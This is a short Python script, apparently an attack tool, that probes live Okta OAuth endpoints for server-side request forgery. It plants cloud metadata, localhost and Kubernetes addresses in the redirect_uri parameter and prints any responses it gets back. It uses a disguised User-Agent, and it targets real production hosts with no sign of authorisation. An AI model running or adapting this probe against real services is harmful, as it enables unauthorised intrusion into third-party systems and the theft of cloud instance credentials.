#!/usr/bin/env python3
"""Quick OKTA SSRF/OAuth probe."""
import urllib.request, urllib.parse, time, sys

PAYLOADS = [
    "http://localhost/",
    "http://127.0.0.1/",
    "http://169.254.169.254/latest/meta-data/instance-id",
    "http://169.254.169.254/latest/user-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://kubernetes.default.svc.cluster.local/",
    "http://169.254.169.254/metadata/v1/",
]

ENDPOINTS = [
    "https://accounts.okta.com/oauth2/v1/authorize?client_id=test&redirect_uri=",
    "https://login.okta.com/oauth2/v1/authorize?client_id=test&redirect_uri=",
    "https://KMq.okta.com/oauth2/v1/authorize?client_id=test&redirect_uri=",
    "https://okta.com/oauth2/v1/authorize?client_id=test&redirect_uri=",
]

print(f"Probing {len(ENDPOINTS)*len(PAYLOADS)} combinations...")
for ep in ENDPOINTS:
    host = ep.split("/")[2]
    for p in PAYLOADS:
        url = ep + urllib.parse.quote(p, safe="")
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            try:
                with urllib.request.urlopen(req, timeout=6) as r:
                    body = r.read(200).decode("utf-8", errors="ignore")
                    if "localhost" in p or "169.254" in p or "metadata" in p:
                        print(f"\n[!!] SSRF candidate: {host}")
                        print(f"    Payload: {p}")
                        print(f"    Status: {r.status}")
                        print(f"    Body: {body[:150]}")
            except urllib.error.HTTPError as e:
                body = e.read(100).decode("utf-8", errors="ignore")
                print(f"  {e.code} {host}: {p[:40]}")
        except Exception as e:
            print(f"  ERR {host}: {e}")
        time.sleep(0.2)
print("\nDone.")
